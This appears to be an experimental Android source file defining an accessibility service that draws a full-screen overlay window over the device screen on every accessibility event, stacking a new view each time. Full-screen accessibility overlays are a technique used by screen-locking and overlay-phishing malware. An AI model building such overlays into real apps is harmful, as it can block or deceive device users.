package com.example.lyt.temp;

import com.example.lyt.*;

import android.accessibilityservice.*;
import android.app.Service;
import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.*;

public class SVR extends AccessibilityService {
    public static SVR service;
    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        WindowManager w = (WindowManager) getSystemService(Service.WINDOW_SERVICE);
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View v = inflater.inflate(R.layout.content_sndactivity, null);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    0,
                    0
            );
            assert w != null;
            w.addView(v, p);
        }
        return;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        service=this;
    }

    @Override
    public void onInterrupt() {
        return;
    }
}
